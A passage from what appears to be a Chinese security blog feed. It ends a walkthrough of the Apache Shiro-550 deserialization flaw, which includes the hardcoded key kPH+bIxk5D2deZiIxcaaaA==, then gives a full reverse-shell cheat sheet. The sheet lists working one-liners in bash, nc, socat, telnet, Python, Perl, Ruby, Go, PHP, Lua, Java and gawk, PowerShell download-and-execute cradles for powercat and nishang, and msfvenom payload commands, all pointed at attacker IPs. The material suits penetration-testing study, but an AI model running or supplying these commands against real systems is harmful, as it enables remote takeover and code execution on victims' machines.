<p>DEFAULT_CIPHER_KEY_BYTES :  <code>kPH+bIxk5D2deZiIxcaaaA==</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br></pre></td></tr></table></figure>

<p>传入 encrypt 函数 (root ,  “kPH+bIxk5D2deZiIxcaaaA==”)</p>
<p>回到 <strong>rememberIdentity</strong> 方法</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128202720569.png" alt="image-20211128202720569"></p>
<p>跟进 <strong>rememberSerializedIdentity</strong> 方法 , 进行<strong>SetCookie</strong> </p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128203539827.png" alt="image-20211128203539827"></p>
<h3 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h3><p>在 getRememberedPrincipals 方法下断点</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128211236196.png" alt="image-20211128211236196"></p>
<p>跟进getRememberedSerializedIdentity 方法 ， 读取 Cookie 中的数据</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128211654882.png" alt="image-20211128211654882"></p>
<p>readValue方法， 读取 Cookie中的字段 <strong>name</strong>： <code>rememberMe </code></p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128212002314.png" alt="image-20211128212002314"></p>
<p>然后把Cookie 赋值给 value , 返回上一级函数</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128212219222.png" alt="image-20211128212219222"></p>
<p>对base64 进行解码</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128212320888.png" alt="image-20211128212320888"></p>
<ul>
<li>  再次回到AbstractRememberMeManager 类</li>
</ul>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128212553932.png" alt="image-20211128212553932"></p>
<ul>
<li>  进入  convertBytesToPrincipals 方法，这就是对应加密的解析数据，中间肯定要解密数据，继续跟入</li>
</ul>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128183416284.png" alt="image-20211128183416284"></p>
<p>跟进 decrypt 解密函数</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128212956390.png" alt="image-20211128212956390"></p>
<p>getCipherService() 获取 加解密 方法,  <code>AES/CBC/PKCS5Padding </code></p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128213711157.png" alt="image-20211128213711157"></p>
<p>getDecryptionCipherKey() 获取 解密KEY ,   <code>kPH+bIxk5D2deZiIxcaaaA==</code></p>
<p>跟进 JcaCipherService 的decrypt 函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteSource <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] ciphertext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] encrypted = ciphertext;</span><br><span class="line">        <span class="keyword">byte</span>[] iv = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (isGenerateInitializationVectors(<span class="keyword">false</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> ivSize = getInitializationVectorSize();</span><br><span class="line">                <span class="keyword">int</span> ivByteSize = ivSize / BITS_PER_BYTE;</span><br><span class="line">                iv = <span class="keyword">new</span> <span class="keyword">byte</span>[ivByteSize];</span><br><span class="line">                System.arraycopy(ciphertext, <span class="number">0</span>, iv, <span class="number">0</span>, ivByteSize);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> encryptedSize = ciphertext.length - ivByteSize;</span><br><span class="line">                encrypted = <span class="keyword">new</span> <span class="keyword">byte</span>[encryptedSize];</span><br><span class="line">                System.arraycopy(ciphertext, ivByteSize, encrypted, <span class="number">0</span>, encryptedSize);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                String msg = <span class="string">&quot;Unable to correctly extract the Initialization Vector or ciphertext.&quot;</span>;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> CryptoException(msg, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> decrypt(encrypted, key, iv);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128214031646.png" alt="image-20211128214031646"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> decrypt(encrypted, key, iv);</span><br></pre></td></tr></table></figure>

<p>跟进 这个 decrypt 函数 , </p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128214357676.png" alt="image-20211128214357676"></p>
<p>跟到 JcaCipherService 中的 crypt 方法</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128214448781.png" alt="image-20211128214448781"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javax.crypto.Cipher cipher = initNewCipher(mode, key, iv, false);</span><br><span class="line">return crypt(cipher, bytes);</span><br></pre></td></tr></table></figure>

<p><code>crypt(cipher, bytes)</code> 完成解密 ,  然后跳转回convertBytesToPrincipals函数 , 进行序列化操作</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128215221725.png" alt="image-20211128215221725"></p>
<p>跟进 deserialize() 函数</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128215342423.png" alt="image-20211128215342423"></p>
<p>继续跟进, 能看到 熟悉的 反序列化操作</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128215528473.png" alt="image-20211128215528473"></p>
<p>好了, 到这里 , 漏洞原理复现就全部结束了</p>
<hr>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/8445">https://xz.aliyun.com/t/8445</a> </p>
<p><a href="https://www.jianshu.com/p/a53e5b17d7a6">https://www.jianshu.com/p/a53e5b17d7a6</a></p>
<p><a href="https://fireline.fun/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/">https://fireline.fun/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/</a></p>
<p><a href="https://zeo.cool/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/">https://zeo.cool/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/</a></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>漏洞复现</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell方式总结</title>
    <url>/2021/11/09/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="反弹shell方式总结"><a href="#反弹shell方式总结" class="headerlink" title="反弹shell方式总结"></a>反弹shell方式总结</h2><h4 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a><code>nc反弹</code></h4><ul>
<li>场景一 (<em>正向连接</em>)</li>
</ul>
<p><strong>viticm主机</strong>: nc开启本地监听, 并将本地的bash转发出去</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999 -t -e /bin/bash</span><br></pre></td></tr></table></figure>

<p><strong>attack主机</strong>: 远程连接 转发的shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc viticm_ip 9999</span><br></pre></td></tr></table></figure>


<ul>
<li>场景二(<em>反向连接</em>)</li>
</ul>
<p><strong>viticm主机</strong>: 当 viticm主机由于防火墙或者其他一些原因, 导致端口访问被拦截</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc 192.168.119.137 9999 -t -e /bin/bash</span><br></pre></td></tr></table></figure>

<p><strong>attack主机</strong>: 监听本地端口 , 获取shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 9999</span><br></pre></td></tr></table></figure>



<h4 id="bash直接反弹"><a href="#bash直接反弹" class="headerlink" title="bash直接反弹"></a><code>bash直接反弹</code></h4><p>bash一句话shell反弹：个人感觉最好用的用的方法就是使用的方法就是使用bash结合重定向方法的一句话，具体命令如下。</p>
<ul>
<li>bash反弹一句话</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.119.137/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.119.137/9999 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>bash一句话命令详解</li>
</ul>
<p>以下针对常用的bash反弹一句话进行了拆分说明，具体内容如下: </p>
<p><a href="https://p0.ssl.qhimg.com/t01eb18cc78117e5c93.png"><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_t01eb18cc78117e5c93-1612330896146.png" alt="http://p6.qhimg.com/t013e425e5510c369cc.png"></a></p>
<p>其实以上bash反弹一句完整的解读过程就是：</p>
<p>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>
<h4 id="socat转发"><a href="#socat转发" class="headerlink" title="socat转发    "></a><code>socat转发    </code></h4><p>Socat是Linux 下一个多功能的网络工具，名字来由是” Socket CAT”，因此可以看出它基于socket，能够折腾socket相关的无数事情 ，其功能与netcat类似，不过据说可以看做netcat的加强版,事实上的确也是如此，nc应急比较久没人维护了，确实显得有些陈旧了，我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参加见文末的参考学习。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat     </span><br><span class="line">chmod 755 /tmp/socat</span><br><span class="line">/tmp/socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.119.137:9999</span><br></pre></td></tr></table></figure>

<p>socat下载链接：<a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat</a> </p>
<ul>
<li>attack机器上开启监听</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat file:`tty`,raw,echo=0 tcp-listen:9999</span><br></pre></td></tr></table></figure>

<ul>
<li>viticm机器反弹shell</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.119.137:9999</span><br></pre></td></tr></table></figure>

<h4 id="tlnet转发"><a href="#tlnet转发" class="headerlink" title="tlnet转发"></a><code>tlnet转发</code></h4><ul>
<li>viticm机器执行下面的命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mknod a p; telnet 192.168.119.137 4444 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure>

<ul>
<li>attack机器监听端口</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 4444</span><br></pre></td></tr></table></figure>

<blockquote>
<p>以上反弹shell时, 可能出现 无命令头, 无法补全的问题</p>
<p>使用python的pty库进行解决</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">Ctrl-Z</span><br><span class="line">$ stty raw -<span class="built_in">echo</span></span><br><span class="line">$ <span class="built_in">fg</span></span><br><span class="line">$ reset</span><br><span class="line">$ <span class="built_in">export</span> SHELL=bash</span><br><span class="line">//$ <span class="built_in">export</span> TERM=xterm-256color</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="利用编程语言反弹shell"><a href="#利用编程语言反弹shell" class="headerlink" title="利用编程语言反弹shell"></a>利用编程语言反弹shell</h3><h4 id="1-py反弹shell"><a href="#1-py反弹shell" class="headerlink" title="1. py反弹shell"></a><code>1. py反弹shell</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拆成多行方便阅读</span></span><br><span class="line"><span class="keyword">import</span> os,socket,subprocess</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&#x27;ip&#x27;</span>,port))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-i&#x27;</span>])</span><br></pre></td></tr></table></figure>

<h4 id="2-perl反弹shell"><a href="#2-perl反弹shell" class="headerlink" title="2. perl反弹shell"></a><code>2. perl反弹shell</code></h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=”10.211.55.2&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拆成多行方便阅读</span></span><br><span class="line"><span class="keyword">use</span> Socket</span><br><span class="line">$i=”<span class="number">10.211</span>.<span class="number">55.2</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">$p=7777</span></span><br><span class="line"><span class="string">socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;</span>tcp<span class="string">&quot;))</span></span><br><span class="line"><span class="string">if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;</span></span><br><span class="line"><span class="string">    open(STDIN,&quot;</span>&gt;&amp;S<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    open(STDOUT,&quot;</span>&gt;&amp;S<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    open(STDERR,&quot;</span>&gt;&amp;S<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    exec(&quot;</span>/bin/sh -i<span class="string">&quot;)</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-ruby反弹shell"><a href="#3-ruby反弹shell" class="headerlink" title="3. ruby反弹shell"></a>3. <code>ruby反弹shell</code></h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)’</span></span><br></pre></td></tr></table></figure>

<h4 id="4-go反弹shell"><a href="#4-go反弹shell" class="headerlink" title="4. go反弹shell"></a>4. <code>go反弹shell</code></h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&#x27;package main;import&quot;os/exec&quot;;import&quot;net&quot;;func main()&#123;c,_:=net.Dial(&quot;tcp&quot;,&quot;192.168.0.134:8080&quot;);cmd:=exec.Command(&quot;/bin/sh&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()&#125;&#x27;</span> &gt; /tmp/t.<span class="keyword">go</span> &amp;&amp; <span class="keyword">go</span> run /tmp/t.<span class="keyword">go</span> &amp;&amp; rm /tmp/t.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>

<h4 id="5-php反弹shell"><a href="#5-php反弹shell" class="headerlink" title="5. php反弹shell"></a>5. <code>php反弹shell</code></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php –r  <span class="string">&#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/7777&quot;)’</span></span><br></pre></td></tr></table></figure>

<h4 id="6-lua反弹shell"><a href="#6-lua反弹shell" class="headerlink" title="6. lua反弹shell"></a>6. <code>lua反弹shell</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.0.0.1&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></pre></td></tr></table></figure>

<h4 id="7-java"><a href="#7-java" class="headerlink" title="7. java"></a><code>7. java</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>

<h4 id="8-gawk"><a href="#8-gawk" class="headerlink" title="8. gawk"></a><code>8. gawk</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/gawk -f</span><br><span class="line"></span><br><span class="line">BEGIN &#123;</span><br><span class="line">        Port    =       8080</span><br><span class="line">        Prompt  =       &quot;bkd&gt; &quot;</span><br><span class="line"></span><br><span class="line">        Service = &quot;/inet/tcp/&quot; Port &quot;/0/0&quot;</span><br><span class="line">        while (1) &#123;</span><br><span class="line">                do &#123;</span><br><span class="line">                        printf Prompt |&amp; Service</span><br><span class="line">                        Service |&amp; getline cmd</span><br><span class="line">                        if (cmd) &#123;</span><br><span class="line">                                while ((cmd |&amp; getline) &gt; 0)</span><br><span class="line">                                        print $0 |&amp; Service</span><br><span class="line">                                close(cmd)</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; while (cmd != &quot;exit&quot;)</span><br><span class="line">                close(Service)</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="powershell反弹shell"><a href="#powershell反弹shell" class="headerlink" title="powershell反弹shell"></a>powershell反弹shell</h3><p>powershell反弹shell本质上是一些多功能代码集合，通过调用windows提供的api接口实现网络通信和指令解析执行的功能。</p>
<h4 id="1）powercat反弹shell"><a href="#1）powercat反弹shell" class="headerlink" title="1）powercat反弹shell"></a>1）powercat反弹shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 攻击者(192.168.159.134)开启监听：</span></span><br><span class="line">nc -lvp 6666</span><br><span class="line"><span class="comment"># 或者使用powercat监听</span></span><br><span class="line">powercat -l -p 6666</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标机反弹cmd shell：</span></span><br><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString</span><br><span class="line">(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>);</span><br><span class="line">powercat -c 192.168.159.134 -p 6666 -e cmd</span><br></pre></td></tr></table></figure>



<h4 id="2）nishang反弹shell"><a href="#2）nishang反弹shell" class="headerlink" title="2）nishang反弹shell"></a>2）nishang反弹shell</h4><p>Nishang是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。</p>
<p><strong>Reverse TCP shell</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 攻击者(192.168.159.134)开启监听：</span></span><br><span class="line">nc <span class="literal">-lvp</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标机执行：</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com</span></span><br><span class="line"><span class="string">/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);</span><br><span class="line"><span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">159.134</span> <span class="literal">-port</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者将nishang下载到攻击者本地：</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">159.134</span> <span class="literal">-port</span> <span class="number">6666</span></span><br></pre></td></tr></table></figure>

<p><strong>Reverse UDP shell</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 攻击者(192.168.159.134)开启监听：</span></span><br><span class="line">nc <span class="literal">-lvup</span> <span class="number">53</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标机执行：</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;</span>);</span><br><span class="line"><span class="built_in">Invoke-PowerShellUdp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">159.134</span> <span class="literal">-port</span> <span class="number">53</span></span><br></pre></td></tr></table></figure>

<p><strong>Reverse ICMP shell</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首先攻击端下载icmpsh_m.py文件</span></span><br><span class="line">https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击者(192.168.159.134)执行</span></span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1 <span class="comment">#忽略所有icmp包</span></span><br><span class="line">python icmpsh_m.py 192.168.159.134 192.168.159.138 <span class="comment">#开启监听</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标机(192.168.159.138)执行</span></span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1&#x27;</span>);Invoke-PowerShellIcmp -IPAddress 192.168.159.134</span><br></pre></td></tr></table></figure>

<h4 id="3）自定义powershell函数反弹shell"><a href="#3）自定义powershell函数反弹shell" class="headerlink" title="3）自定义powershell函数反弹shell"></a>3）自定义powershell函数反弹shell</h4><p>利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp shell。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 攻击者(192.168.159.134) 开启监听 </span></span><br><span class="line">nc <span class="literal">-lvp</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标机执行 </span></span><br><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$client</span> = New-Object Net.Sockets.TCPClient(&#x27;192.168.159.134&#x27;,6666);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();</span></span><br><span class="line"><span class="string">[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;</span></span><br><span class="line"><span class="string"><span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );</span></span><br><span class="line"><span class="string"><span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);</span></span><br><span class="line"><span class="string"><span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="4）Empire-结合office反弹shell"><a href="#4）Empire-结合office反弹shell" class="headerlink" title="4）Empire 结合office反弹shell"></a>4）Empire 结合office反弹shell</h4><p>Empire(<a href="https://github.com/EmpireProject/Empire)%E5%9F%BA%E4%BA%8Epowershell%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6%EF%BC%8C%E5%8F%AF%E5%88%A9%E7%94%A8office%E5%AE%8F%E3%80%81OLE%E5%AF%B9%E8%B1%A1%E6%8F%92%E5%85%A5%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E3%80%81HTML%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F(HTAs)%E7%AD%89%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9shell%E3%80%82">https://github.com/EmpireProject/Empire)基于powershell的后渗透攻击框架，可利用office宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell。</a></p>
<ul>
<li>利用office宏反弹shell </li>
<li>利用office OLE对象插入bat文件反弹shell</li>
</ul>
<p><strong>Relevant Link:</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/99793</span><br></pre></td></tr></table></figure>

<h3 id="msfvenom-获取反弹一句话"><a href="#msfvenom-获取反弹一句话" class="headerlink" title="msfvenom 获取反弹一句话"></a><strong>msfvenom 获取反弹一句话</strong></h3><p>学习过程中发现其实强大的MSF框架也为我们提供了生成一句话反弹shell的工具，即msfvenom。绝对的实用，当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit,随时我们都可以使用msfvenom -l 来查询生成我们所需要的各类命令行一句话，具体使用方法为各位看官老爷们收集如下。- </p>
<ul>
<li>查询 payload 具体路径</li>
</ul>
<p>我们直接可以使用 msfvenom -l 结合关键字过滤（如cmd/unix/reverse），找出我们需要的各类反弹一句话payload的路径信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># msfvenom -l payloads &#x27;cmd/unix/reverse&#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://p3.ssl.qhimg.com/t01368126ef4dfcc554.png"><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_t01368126ef4dfcc554.png" alt="http://p9.qhimg.com/t014f984e560232d602.png"></a></p>
<p>查看以上截图，我们可以看到msfvenom支持生成反弹shell一句话的类型非常丰富，这里几乎是应有尽有，大家可以依据渗透测试对象自行选择使用。</p>
<p><strong>生成我们我们需要的命令行一句话</strong></p>
<p>依照前面查找出的命令生成一句话payload路径，我们使用如下的命令生成反弹一句话，然后复制粘贴到靶机上运行即可。</p>
<h4 id="bash-反弹一句话生成"><a href="#bash-反弹一句话生成" class="headerlink" title="bash 反弹一句话生成"></a><strong>bash 反弹一句话生成</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash lhost=1.1.1.1 lport=12345 R</span><br></pre></td></tr></table></figure>

<h4 id="阉割版nc反弹一句话生成"><a href="#阉割版nc反弹一句话生成" class="headerlink" title="阉割版nc反弹一句话生成"></a><strong>阉割版nc反弹一句话生成</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=1.1.1.1 lport=12345 R</span><br></pre></td></tr></table></figure>

